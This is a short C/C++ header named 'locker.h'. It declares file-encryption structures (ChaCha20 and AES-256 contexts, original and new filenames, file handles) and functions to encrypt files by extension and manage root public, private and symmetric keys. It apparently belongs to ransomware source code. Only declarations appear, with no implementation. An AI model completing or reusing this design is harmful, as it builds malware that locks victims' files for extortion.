#ifndef _LOCKER_H_
#define _LOCKER_H_

#include "macro.h"
#include "pathsystem.h"
#include "chacha20/ecrypt-sync.h"
#include "aes/aes256.h"

namespace locker
{
	typedef struct file_info
	{
		laced_ctx CryptCtx;
		crypto_aes_ctx CryptCtxAES;
		LPCWSTR Filename;
		WCHAR* newFilename;
		LPCWSTR FilePath;
		HANDLE FileHandle;
		HANDLE newFileHandle;
		LONGLONG Filesize;		
		DWORD bit;
	}FILE_INFO, * PFILE_INFO;
	
	typedef struct HashList
	{		
		BYTE* hash;
		size_t hash_size;
		SLIST_ENTRY(HashList);
	} *PHLIST, HLIST;


	
	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList);
	BOOL HandlerASymmetricGenKey();

	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
	VOID LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV);
}

typedef locker::HLIST HASH_LIST;
typedef locker::HLIST* PHASH_LIST;
typedef locker::FILE_INFO FILE_INFO;


#endif